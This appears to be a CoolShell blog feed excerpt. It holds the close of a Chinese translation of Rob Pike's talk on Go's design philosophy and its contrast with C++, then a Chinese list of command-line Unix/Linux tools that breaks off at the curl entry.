<p>在这场讲座的几个月之前我做了一场讲座(你可以通过<a href="http://video.google.com/videoplay%EF%BC%9Fdocid=810232012617965344" target="_blank">YouTube</a>看到)，讲的是一个我1980年代做的一个玩具并发编程语言。 这个语言叫<a href="ftp://cs.bell-labs.com/cm/cs/who/rsc/thread/newsqueak.pdf" target="_blank">Newsqueak</a>，而且显然地，它成为了Go的前身。</p>
<p>在我在Google工作的过程中，我发现我丢掉了Newsqueak中的一些点子。 现在我将重新思考它们，所以我才做了那场讲座。 我相信它们会让服务器端编程变得更容易，而且Google能真正从中获益。</p>
<p>我真的尝试将这些点子加入到C++中，可惜失败了。 我实在难以将一组并发操作融入到C++的控制流程中去——当真融进去的话，它们将变得十分丑陋，从而难以看到优越性。 另外，C++将它变得十分臃肿(虽然我从来没真正发现C++苗条过)。 所以我放弃了这个想法。</p>
<p>但是C++0x的讲座使我再次思考。 一件事十分困扰我——我相信也困扰着Ken和Robert——C++的新内存模型居然新增了原子类型。 为这个不堪重负的类型系统加上这么个细致精巧到极致类型机制十分的不靠谱，不是么？ 将语言和今日的硬件绑在一起似乎有点目光短浅并且不明智，因为硬件过几年就有大变。</p>
<p>那场C++0x讲座结束之后，我们回到办公室。 我开始了另一个编译(译者笑)，转过转过我的椅子，面对Robert，然后开始问一些尖锐的问题。 在编译完成之前，我们拉拢了Ken，并决定做些什么。 我们再也不想写C++了，并且我们——尤其是我——在写Google代码时，想让并发拿来就用。 同时我们也想解决”大系统编程”的问题，容后细说。</p>
<p>我们在白板上写下一组我们需要的东西——迫切需要的那种。 我们规划出大体的轮廓，忽略了语法细节和语义。</p>
<p>我仍然有一条碉堡了的那周的邮件线索。 这是一些摘录:</p>
<blockquote>
<p><strong>Robert</strong>: 起点: C，修补一些显而易见的瑕疵，去除繁杂的东西。 新增一些特性。</p>
<p><strong>Rob</strong>: 命名为’go’。 你可以为这个名字编造各种理由，但是它确实拥有很多好的特性。 它短小，易于打出。 工具么: goc，gol，goa。 如果有个交互式调试器/解释器，可以直接叫’go’。 代码后缀是。go。</p>
<p><strong>Robert</strong>: 空接口: interface {}。 将被所有接口实现(译者: 原文如此)，并且可以取代void*。</p>
</blockquote>
<p>我们并没有立即全部设计出来。 比如我们花了一年多才设计出了数组(array)和切片(slice)。 不过相当一部分重要的设计在最初的几天中浮现。</p>
<p>注意到Robert说C是起点，并非C++。 对于这点我不是很确定，不过我相信他说的是C，因为Ken在场(译者笑)。 但是最后我们并没有从C开始，这倒是真的。 我们从最初的草稿开始，仅仅从其它语言中借鉴琐碎的东西，比如运算符，各种括号和一些常见的关键字。(当然我们也借鉴了我们所知道的语言中的思想。)不管怎么说，我们破而后立，从头做起，以此来响应C++。 我们并非想做一个更好的C++，甚至不是一个更好的C。 它仅仅是一个对我们所关心的软件来说更好的语言。</p>
<p>最后，我们得到了既不同于C也不同于C++的东西，甚至比许多人意识到的还要不同。 我列了一个对于C和C++的Go的重要的简化的列表:</p>
<ul>
<li>常规的语法(不需要一个符号表来辅助解析)</li>
<li>GC机制(仅仅是GC)</li>
<li>没有头文件</li>
<li>显式依赖关系</li>
<li>没有循环依赖</li>
<li>数字常量仅仅是数字(译者: 没有类型)</li>
<li>int和int32不是同种类型</li>
<li>字母大小写将确定可见性</li>
<li>任何类型都可以有方法(没有类)</li>
<li>没有子类型继承(没有子类)</li>
<li>包级别的初始化和良好定义的初始化顺序</li>
<li>同一个包的文件一起编译</li>
<li>包级别的全局定义可以以任意顺序进行</li>
<li>没有算术类型转换(常量可以弥补)</li>
<li>接口是隐式实现的(没有”implements”声明)</li>
<li>嵌入的结构体(没有类型提升和子类)</li>
<li>方法像函数一样定义(不必定义在特殊的地方)</li>
<li>方法就是函数</li>
<li>接口就是方法(没有数据)</li>
<li>方法仅仅靠名字匹配(不是靠类型)</li>
<li>没有构造函数和析构函数</li>
<li>后置增量/减量运算符仅仅是语句，而不是表达式</li>
<li>没有前置增量/减量运算符</li>
<li>赋值号是语句，不是表达式</li>
<li>表达式求值顺序在赋值和函数调用时确定(没有所谓的”sequence point”)</li>
<li>没有指针算术</li>
<li>内存总是初始化为0</li>
<li>对本地变量取地址是合法的</li>
<li>方法中没有叫this的指针</li>
<li>分段式栈</li>
<li>没有常量或其它类型的注记</li>
<li>没有模板</li>
<li>没有异常</li>
<li>内建字符串，切片和映射(map)</li>
<li>数组边界检查</li>
</ul>
<p>并且，我相信通过这一系列的简化，Go将比C或C++更具有表现力。 少即是多。</p>
<p>但是我们没法一下子把所有部分都做出来。 我们需要构建最基础的部分，比如说类型系统的表示，能良好应用于实际的语法，和一些无法形容的但能让库更容易相互操作的东西。</p>
<p>我们同样增加了C或C++中没有的东西，比如切片和映射，组合字面量(？)，文件顶层的表达式(这虽是件大事，但是几乎不为人知)，反射机制，GC等等。 自然，还有并发。</p>
<p>一个显眼的缺少的东西是类型的继承。 请允许我粗暴地对待它一分钟。</p>
<p>早先构建Go的时候有人跟我说，他无法想象用一门没有泛型的语言工作。 正如我在别处说明的那样，我觉得这是个很诡异的言论。</p>
<p>公平起见，他用自己的话说可能是他真的很喜欢C++中STL的那些容器。 以辩论为目的的话，我们来正面看看他的言论。</p>
<p>他说的意味着: 他发现写一个容器，比如以int为元素类型的链表，或字符串映射是一种不能忍的重负。 我发现这是个很诡异的言论，因为我几乎没把时间花在那些个问题上，即使我在用没有泛型的语言。</p>
<p>但是，更重要的是，他说的那些表示<em>类型系统</em>将会解除这种负担。 <em>类型系统</em>。 不是多态函数，或语言级原语，或其它类型的辅助手段(helpers)，而仅仅是<em>类型系统</em>。</p>
<p>这就是粘住我的那个细节。</p>
<p>从C++或Java来Go的程序员怀念和类型系统在一起的日子，特别是带继承和子类的那部分。 也许我在类型系统方面是粗暴了些，但是我绝不觉得那套玩意非常具有表现力。</p>
<p>我已故的朋友Alain Fournier一次告诉我说他认为学术工作的最底层是分类学。 然后信不信由你，类型继承正是分类学。 你必须决定哪个萝卜扔哪个坑里，每个类型的父类型，A是否继承B或者B是否继承A。 一个可排序的数组是一个带有sort方法的数组呢，还是一个长得像数组的排序器呢？ 如果你觉得类型系统能解决所有设计上的问题，你必须做出这个无意义的选择。</p>
<p>我相信对编程来说那是个荒诞的思路。 真正的重点不在于事物之间的继承关系，而在于它们能提供些什么。</p>
<p>因此，接口这个概念进入了Go。 但是它们都是主要部分——真正的Go之道——的一部分。</p>
<p>如果C++和Java注重类型继承和类型系统的分类学，那末Go就注重组合。</p>
<p>Doug Mcilroy，Unix管道的最终发明人，在1964年(!)写道:</p>
<blockquote><p>我们应该有一些机制能将程序耦合(串)起来，像花园软管那样——当我们需要另一种方式传送数据时，拧紧另外一段即可。 I/O也可以这么做。</p></blockquote>
<p>这也是Go所提倡的道路。 Go吸收这个观点，然后把它推进得十分远。 这是一门关于(功能上的)组合和(调用上的)耦合的语言。</p>
<p>一个显然的例子是接口是组合各部分的途径。 关键是，那些部分是什么并不重要，如果某类型实现了M方法我就可以把这个方法填到接口里去。</p>
<p>另一个重要的例子是如何让并发性提供给我们不同的独立计算部分的组合。</p>
<p>并且还有一种不同寻常(但十分简单)的类型组合形式: 嵌入。</p>
<p>————————————————————————</p>
<p>我想提一个和之前不太相关的Go设计: Go被设计为大型团队用来写大型程序的语言。</p>
<p>这里有个概念是”大型编程”，并且不知何故C++和Java主宰了这个领域。 我相信这只是因为其历史巧合，或者是工业上的巧合。 但是被广泛接纳的观点是他们和面向对象设计有关。</p>
<p>我压根不相信这点。 大型软件需要确定的方法，但是更重要的是它需要强依赖性管理，干净的接口抽象和优越的文档工具。 C++没一点做得好的(虽然Java明显要好很多)。</p>
<p>我们还不知道Go语言能做到何种程度，因为现在还没有足够的软件是用Go写的。 但是我非常有信心于Go将会成为一个优越的大型编程语言。 时间会说明一切的。</p>
<p>————————————————————————</p>
<p>现在，回到我们演讲开始提的那个问题:</p>
<p>为什么Go，作为从头被设计为符合C++使用者习惯的语言，没有吸引很多C++程序员？</p>
<p>严肃点说，我觉得是因为Go和C++在哲学方面有着巨大的不同。</p>
<p>C++是将所有东西提到你指尖上(译者: 即多范式)。 我在C++11的FAQ上找到了这段引用:</p>
<blockquote><p>C++能优雅地，灵活地，零损耗地(相比于手工操纵代码)表达抽象的能力大幅提升了。</p></blockquote>
<p>Go并非这种”围绕式”的。 你并不需要所有的东西都内建好。 你不需要对每个执行细节进行精细的控制。 比如，你不需要RAII，但你拥有一个垃圾回收器，也意味着你不需要执行释放内存的操作。</p>
<p>你得到的是一组非常强有力但易于理解，易于用来构建积木的功能，这些积木可以用来组合出一个你需要的问题的解法。 这并不意味着它能像别的一些语言创造的解法一样快速，复杂，或带来思想上的激励，但是它总能保证易于书写，易于阅读，易于理解，易于维护，而且可能更安全。</p>
<p>从另一个角度说，这当然算作过度简化:</p>
<p>Python和Ruby程序员转到Go，因为他们不需要牺牲表达能力，却获得了性能的提升，并且能好好玩并发系统了。</p>
<p>C++程序员<em>并没有</em>转到Go是因为他们好不容易获得了对程序的精细控制，并且不想牺牲它们的任何一部分。 对他们而言，写软件不仅包括把事情做完，而且包括用特定的方式完成。</p>
<p>关键是，在将来，Go的成功将会颠覆他们的世界观。</p>
<p>并且从一开始我们就应该意识到这点。 对于C++11的新特性很兴奋的人们并不关心一个拥有如此少特性的语言。 即使最后他提供了如此多。</p>
<p>谢谢。</p>
<p>（全文完）</p>
 ]]></content>
<pubDate>2012-07-05T08:12:25+08:00</pubDate>
<guid>https://coolshell.cn/articles/7771.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 28个Unix/Linux的命令行神器 ]]></title>
<link>https://coolshell.cn/articles/7829.html</link>
<content><![CDATA[ 
<p>下面是<a href="https://kkovacs.eu/" target="_blank">Kristóf Kovács</a>收集的28个Unix/Linux下的28个命令行下的工具（<a href="https://kkovacs.eu/cool-but-obscure-unix-tools" target="_blank">原文链接</a>），有一些是大家熟悉的，有一些是非常有用的，有一些是不为人知的。这些工具都非常不错，希望每个人都知道。本篇文章还在<a href="https://news.ycombinator.com/item?id=2567186" target="_blank">Hacker News上被讨论</a>，你可以过去看看。我以作者的原文中加入了官网链接和一些说明。</p>
<div class="alpha grid_6">
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#dstat_sar" title="dstat &amp; sar">dstat &amp; sar</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#slurm" title="slurm">slurm</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#vim_emacs" title="vim &amp; emacs">vim &amp; emacs</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#screen_dtach_tmux_byobu" title="screen, dtach, tmux, byobu">screen, dtach, tmux, byobu</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#multitail" title="multitail">multitail</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#tpp" title="tpp">tpp</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#xargs_parallel" title="xargs &amp; parallel">xargs &amp; parallel</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-8" href="#duplicity_rsyncrypto" title="duplicity &amp; rsyncrypto">duplicity &amp; rsyncrypto</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-9" href="#nethack_slashem" title="nethack &amp; slash’em">nethack &amp; slash’em</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-10" href="#lftp" title="lftp">lftp</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-11" href="#ack" title="ack">ack</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-12" href="#calcurse_remind_wyrd" title="calcurse &amp; remind + wyrd">calcurse &amp; remind + wyrd</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-13" href="#newsbeuter_rsstail" title="newsbeuter &amp; rsstail">newsbeuter &amp; rsstail</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-14" href="#powertop" title="powertop">powertop</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-15" href="#htop_iotop" title="htop &amp; iotop">htop &amp; iotop</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-16" href="#ttyrec_ipbt" title="ttyrec &amp; ipbt">ttyrec &amp; ipbt</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-17" href="#rsync" title="rsync">rsync</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-18" href="#mtr" title="mtr">mtr</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-19" href="#socat_netpipes" title="socat &amp; netpipes">socat &amp; netpipes</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-20" href="#iftop_iptraf" title="iftop &amp; iptraf">iftop &amp; iptraf</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-21" href="#siege_tsung" title="siege &amp; tsung">siege &amp; tsung</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-22" href="#ledger" title="ledger">ledger</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-23" href="#taskwarrior" title="taskwarrior">taskwarrior</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-24" href="#curl" title="curl">curl</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-25" href="#rtorrent_aria2" title="rtorrent &amp; aria2">rtorrent &amp; aria2</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-26" href="#ttytter_earthquake" title="ttytter &amp; earthquake">ttytter &amp; earthquake</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-27" href="#vifm_ranger" title="vifm &amp; ranger">vifm &amp; ranger</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-28" href="#cowsay_sl" title="cowsay &amp; sl">cowsay &amp; sl</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="dstat_sar"></span>dstat &amp; sar<span class="ez-toc-section-end"></span>
</h4>
<p>iostat, vmstat, ifstat 三合一的工具，用来查看系统性能（我在《<a title="性能调优攻略" href="https://coolshell.cn/articles/7490.html" target="_blank">性能调优攻略</a>》中提到过那三个xxstat工具）。</p>
<p>官方网站：<a href="http://dag.wieers.com/rpm/packages/dstat/" target="_blank">http://dag.wieers.com/rpm/packages/dstat/</a></p>
<p>你可以这样使用：</p>
<p><code data-enlighter-language="shell" class="EnlighterJSRAW">alias dstat='dstat -cdlmnpsy'</code></p>
<div class="align_right">
<p><img alt="image placeholder" ></p>
<h4 class="caption_text">
<span class="ez-toc-section" id="slurm"></span>slurm<span class="ez-toc-section-end"></span>
</h4>
</div>
<p>查看网络流量的一个工具</p>
<p>官方网站：<em>  <a href="https://computing.llnl.gov/linux/slurm/" target="_blank">Simple Linux Utility for Resource Management</a></em></p>
<p><span id="more-7829"></span></p>
<div class="align_right">
<p><img alt="image placeholder" ></p>
<p class="caption_text">
</p>
</div>
<h4>
<span class="ez-toc-section" id="vim_emacs"></span>vim &amp; emacs<span class="ez-toc-section-end"></span>
</h4>
<p>真正程序员的代码编辑器。</p>
<div class="align_right">
<p><img alt="image placeholder" ></p>
<p class="caption_text">
</p>
</div>
<h4>
<span class="ez-toc-section" id="screen_dtach_tmux_byobu"></span>screen, dtach, tmux, byobu<span class="ez-toc-section-end"></span>
</h4>
<p>你是不是经常需要 SSH 或者 telent 远程登录到 Linux 服务器？你是不是经常为一些长时间运行的任务而头疼，比如系统备份、ftp 传输等等。通常情况下我们都是为每一个这样的任务开一个远程终端窗口，因为他们执行的时间太长了。必须等待它执行完毕，在此期间可不能关掉窗口或者断开连接，否则这个任务就会被杀掉，一切半途而废了。</p>
<p><a href="https://www.gnu.org/software/screen/" target="_blank"><strong>Screen</strong></a>是一个可以在多个进程之间多路复用一个物理终端的窗口管理器。Screen中有会话的概念，用户可以在一个screen会话中创建多个screen窗口，在每一个screen窗口中就像操作一个真实的telnet/SSH连接窗口那样。请参看IBM DeveloperWorks的这篇文章《<a href="https://www.ibm.com/developerworks/cn/linux/l-cn-screen/" target="_blank">使用 screen 管理你的远程会话</a>》</p>
<p><img alt="image placeholder" ></p>
<p><a href="http://dtach.sourceforge.net/" target="_blank"><strong>dtach</strong> </a>是用来模拟screen的detach的功能的小工具，其可以让你随意地attach到各种会话上 。下图为dtach+dvtm的样子。</p>
<p><img alt="image placeholder" ></p>
<p><strong><a title="http://tmux.sourceforge.net/" href="http://tmux.sourceforge.net/" rel="nofollow">tmux</a></strong>是一个优秀的终端复用软件，类似<a title="http://www.gnu.org/software/screen/" href="https://www.gnu.org/software/screen/" rel="nofollow">GNU Screen</a>，但来自于OpenBSD，采用BSD授权。使用它最直观的好处就是，通过一个终端登录远程主机并运行tmux后，在其中可以开启多个控制台而无需再“浪费”多余的终端来连接这台远程主机；当然其功能远不止于此。与screen相比的优点：可以横向和纵向分割窗口，且窗格可以自由移动和调整大小。可在多个缓冲区进行复制和粘贴，支持跨窗口搜索；非正常断线后不需重新detach；……  有人说——<strong>与tmux相比，screen简直弱爆了</strong>。</p>
<p><img alt="image placeholder" ></p>
<div class="align_right">
<p><a href="https://launchpad.net/byobu/" target="_blank"><strong>byobu</strong></a>是Ubuntu开发的，在Screen的基础上进行包装，使其更加易用的一个工具。最新的Byobu，已经是基于Tmux作为后端了。可通过“byobu-tmux”这个命令行前端来接受各种与tmux一模一样的参数来控制它。Byobu的细节做的非常好，效果图如下：<img alt="image placeholder" ></p>
<p class="caption_text">
</p>
</div>
<h4>
<span class="ez-toc-section" id="multitail"></span>multitail<span class="ez-toc-section-end"></span>
</h4>
<p>MultiTail是个用来实现同时监控多个文档、类似tail命令的功能的软件。他和tail的区别就是他会在控制台中打开多个窗口，这样使同时监控多个日志文档成为可能。他还可以看log文件的统计，合并log文件，过滤log文件，分屏，……。</p>
<p>官网：<a href="http://www.vanheusden.com/multitail/">http://www.vanheusden.com/multitail/</a></p>
<div class="align_right">
<p><img alt="image placeholder" ></p>
<p class="caption_text">
</p>
</div>
<h4>
<span class="ez-toc-section" id="tpp"></span>tpp<span class="ez-toc-section-end"></span>
</h4>
<p>终端下的PPT，要是在某某大会上用这个演示PPT，就太TMD的Geek了。</p>
<p>官网：<a href="http://www.ngolde.de/tpp.html">http://www.ngolde.de/tpp.html</a></p>
<div class="align_right">
<p><img alt="image placeholder" ></p>
<p class="caption_text">
</p>
</div>
<h4>
<span class="ez-toc-section" id="xargs_parallel"></span>xargs &amp; parallel<span class="ez-toc-section-end"></span>
</h4>
<p>Executes tasks from input (even multithread).</p>
<p>xargs 是一个比较古老的命令，有简单的并行功能，这个不说了。<span>对于</span><a href="https://www.gnu.org/software/parallel/"><span>GNU parallel</span></a><span> ( </span><a href="https://savannah.gnu.org/projects/parallel"><span>online manpage</span></a><span><span> )来说，它不仅能够处理本机上多执行绪，还能分散至远端电脑协助处理。</span><span>而使用GNU parallel前，要先确定本机有安装GNU parallel / ssh / rsync，远端电脑也要安装ssh。</span></span></p>
<div class="align_right">
<p><img alt="image placeholder" ></p>
<p class="caption_text">
</p>
</div>
<h4>
<span class="ez-toc-section" id="duplicity_rsyncrypto"></span>duplicity &amp; rsyncrypto<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://duplicity.nongnu.org/" target="_blank">Duplicity</a>是使用rsync算法加密的高效率备份软件，Duplicity支持目录加密生产和格式上传到远程或本地文件服务器。</p>
<p><a href="http://rsyncrypto.lingnu.com/index.php/Home_Page" target="_blank">rsyncrypto</a> 就是 rsync + encryption。对于rsync的算法可参看酷壳的<a title="rsync 的核心算法" href="https://coolshell.cn/articles/7425.html" target="_blank">rsync核心算法</a>。</p>
<p>Encrypting backup tools.</p>
<div class="align_right">
<p><img alt="image placeholder" ></p>
<p class="caption_text">
</p>
</div>
<h4>
<span class="ez-toc-section" id="nethack_slashem"></span>nethack &amp; slash’em<span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://www.nethack.org/" target="_blank">NetHack</a>（<a href="https://zh.wikipedia.org/zh/NetHack" target="_blank">Wiki</a>），20年历史的古老电脑游戏。没有声音，没有漂亮的界面，不过这个游戏真的很有意思。网上有个家伙说：<strong>如果你一生只做一件事情，那么玩NetHack</strong>。这句话很惹眼，但也让人觉得这个游戏很复杂不容易上手。其实，这个游戏很虽然很复杂，却容易上手。虽然玩通关很难，但上手很容易。NetHack上有许多复杂的规则，”the DevTeam thinks of everything”（开发团队想到了所有的事情)。各种各样的怪物，各种各样的武器….，有许多spoilers文件来说明其规则。除了每次开始随机生成的地图，每次玩游戏，你也都会碰到奇怪的事情: 因为喝了一种药水，变成了机器人;因为踢坏了商店的门被要求高价赔偿;你的狗为你偷来了商店的东西….. 这有点象人生，你不能完全了解这个世界，但你仍然可以选择自己的面对方式。</p>
<p>网上有许多文章所这是最好的电脑游戏或最好的电脑游戏之一。也许是因为它开放的源代码让人赞赏，古老的历史让人宽容，复杂的规则让人敬畏。虽然它不是当前流行的游戏，但它比任何一个当前流行的游戏都更有可能再经受20年的考验。</p>
<p><a href="http://www.slashem.org" target="_blank">Slash’EM</a> 也是一个基于NetHack的经典游戏。</p>
<div class="align_right">
<p><img alt="image placeholder" ></p>
<p class="caption_text">
</p>
</div>
<h4>
<span class="ez-toc-section" id="lftp"></span>lftp<span class="ez-toc-section-end"></span>
</h4>
<p>利用<a href="http://lftp.yar.ru/" target="_blank">lftp</a>命令行ftp工具进行网站数据的增量备份，镜像，就像使用rsync一样。</p>
<div class="align_right">
<p><img alt="image placeholder" ></p>
<p class="caption_text">
</p>
</div>
<h4>
<span class="ez-toc-section" id="ack"></span>ack<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://betterthangrep.com/"><span>ack</span></a><span>是一个perl脚本，是grep的一个可选替换品。其可以对匹配字符有高亮显示。是为程序员专门设计的，默认递归搜索，省提供多种文件类型供选。</span></p>
<div class="align_right">
<p><img alt="image placeholder" ></p>
<p class="caption_text">
</p>
</div>
<h4>
<span class="ez-toc-section" id="calcurse_remind_wyrd"></span>calcurse &amp; remind + wyrd<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://calcurse.org/" target="_blank">calcurse</a>是一个命令行下的日历和日程软件。<a href="https://www.roaringpenguin.com/products/remind" target="_blank">remind</a> + <a href="http://pessimization.com/software/wyrd/" target="_blank">wyrd</a>也很类似。关于日历，我不得不提一个<a title="Linux的cycle日历（你懂的）" href="https://coolshell.cn/articles/3489.html" target="_blank">Linux的Cycle日历</a>，也是一个神器，呵呵。</p>
<div class="align_right">
<p><img alt="image placeholder" ></p>
<p class="caption_text">
</p>
</div>
<h4>
<span class="ez-toc-section" id="newsbeuter_rsstail"></span>newsbeuter &amp; rsstail<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://newsbeuter.org/" target="_blank">newsbeuter </a>和 <a href="http://www.vanheusden.com/rsstail/" target="_blank">rsstail</a> 是命令行下RSS的阅读工具。</p>
<div class="align_right">
<p><img alt="image placeholder" ></p>
<p class="caption_text">
</p>
</div>
<h4>
<span class="ez-toc-section" id="powertop"></span>powertop<span class="ez-toc-section-end"></span>
</h4>
<p><a title="做个环保主义的程序员" href="https://coolshell.cn/articles/7186.html" target="_blank">做个环保的程序员</a>，看看自己的电脑里哪些程序费电。<a href="https://01.org/powertop/" target="_blank">PowerTOP</a> 是一个让 Intel 平台的笔记本电脑节省电源的 Linux 工具。此工具由 Intel 公司发布。它可以帮助用户找出那些耗电量大的程序，通过修复或者关闭那些应用程序或进程，从而为用户节省电源。</p>
<div class="align_right">
<p><img alt="image placeholder" ></p>
<p class="caption_text">
</p>
</div>
</div>
<div class="omega grid_6">
<h4>
<span class="ez-toc-section" id="htop_iotop"></span>htop &amp; iotop<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://htop.sourceforge.net/" target="_blank">htop</a> 和 <a href="http://guichaz.free.fr/iotop/" target="_blank">iotop</a>  用来查看进程，内存和IO负载。</p>
<div class="align_right">
<p><img alt="image placeholder" ></p>
</div>
<h4>
<span class="ez-toc-section" id="ttyrec_ipbt"></span>ttyrec &amp; ipbt<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://0xcc.net/ttyrec/index.html.en" target="_blank">ttyrec</a> 是一个 tty 控制台录制程序，其所录制的数据文件可以使用与之配套的 ttyplay 播放。不管是你在 tty 中的各种操作，还是在 tty 中耳熟能详的软件，都可进行录制。</p>
<p><a href="http://www.chiark.greenend.org.uk/~sgtatham/ipbt/" target="_blank">ipbt</a> 是一个用来回放 ttyrec 所录制的控制台输入过程的工具。</p>
<p>与此类似的还有<a href="http://shelr.tv/" target="_blank">Shelr</a> 和 <a href="https://sourceforge.net/projects/termrec/" target="_blank">termrec </a></p>
<div class="align_right">
<p><img alt="image placeholder" ></p>
<p class="caption_text">
</p>
</div>
<h4>
<span class="ez-toc-section" id="rsync"></span>rsync<span class="ez-toc-section-end"></span>
</h4>
<p>通过SSH进行文件同步的经典工具（<a title="rsync 的核心算法" href="https://coolshell.cn/articles/7425.html" target="_blank">核心算法</a>）</p>
<div class="align_right">
<p><img alt="image placeholder" ></p>
<p class="caption_text">
</p>
</div>
<h4>
<span class="ez-toc-section" id="mtr"></span>mtr<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://www.bitwizard.nl/mtr/" target="_blank">MTR</a> – traceroute 2.0，其是把 traceroute 和 ping 集成在一块的一个小工具 用于诊断网络。</p>
<div class="align_right">
<p><img alt="image placeholder" ></p>
<p class="caption_text">
</p>
</div>
<h4>
<span class="ez-toc-section" id="socat_netpipes"></span>socat &amp; netpipes<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://www.dest-unreach.org/socat/" target="_blank">socat</a>是一个多功能的网络工具，名字来由是” Socket CAT”，可以看作是netcat的N倍加强版。</p>
<p><a href="http://web.purplefrog.com/~thoth/netpipes/" target="_blank">netpipes</a> 和socat一样，主要是用来在命令行来进行socket操作的命令，这样你就可以在Shell脚本下行进socket网络通讯了。</p>
<div class="align_right">
<p><img alt="image placeholder" ></p>
<p class="caption_text">
</p>
</div>
<h4>
<span class="ez-toc-section" id="iftop_iptraf"></span>iftop &amp; iptraf<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://www.ex-parrot.com/~pdw/iftop/" target="_blank">iftop</a>和<a href="http://iptraf.seul.org/" target="_blank">iptraf</a>可以用来查看当前网络链接的一些流量情况。</p>
<div class="align_right">
<p><img alt="image placeholder" ></p>
<p><img alt="image placeholder" ></p>
<p class="caption_text">
</p>
</div>
<h4>
<span class="ez-toc-section" id="siege_tsung"></span>siege &amp; tsung<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://www.joedog.org/siege-home/" target="_blank">Siege</a>是一个压力测试和评测工具，设计用于WEB开发这评估应用在压力下的承受能力：可以根据配置对一个WEB站点进行多用户的并发访问，记录每个用户所有请求过程的相应时间，并在一定数量的并发访问下重复进行。</p>
<p><a href="http://tsung.erlang-projects.org/" target="_blank">Tsung</a> 是一个压力测试工具，可以测试包括HTTP, WebDAV, PostgreSQL, MySQL, LDAP, and XMPP/Jabber等服务器。针对 HTTP 测试，Tsung 支持 HTTP 1.0/1.1 ，包含一个代理模式的会话记录、支持 GET、POST 和 PUT 以及 DELETE 方法，支持 Cookie 和基本的 WWW 认证，同时还支持 SSL。</p>
<p>参看：<a title="十个免费的Web压力测试工具" href="https://coolshell.cn/articles/2589.html" target="_blank">十个免费的Web压力测试工具</a></p>
<div class="align_right">
<p><img alt="image placeholder" ></p>
<p class="caption_text">
</p>
</div>
<h4>
<span class="ez-toc-section" id="ledger"></span>ledger<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://ledger-cli.org/" target="_blank">ledger</a> 一个命令行下记帐的小工具。</p>
<div class="align_right">
<p><img alt="image placeholder" ></p>
<p class="caption_text">
</p>
</div>
<h4>
<span class="ez-toc-section" id="taskwarrior"></span>taskwarrior<span class="ez-toc-section-end"></span>
</h4>
<p><a href="https://taskwarrior.org/projects/show/taskwarrior" target="_blank">TaskWarrior</a> 是一个基于命令行的 TODO 列表管理工具。主要功能包括：标签、彩色表格输出、报表和图形、大量的命令、底层API、多用户文件锁等功能。</p>
<div class="align_right">
<p><img alt="image placeholder" ></p>
<p>下图是TaskWarrior 2.0的界面：</p>
<p><img alt="image placeholder" ></p>
<p class="caption_text">
</p>
</div>
<h4>
<span class="ez-toc-section" id="curl"></span>curl<span class="ez-toc-section-end"></span>
</h4>
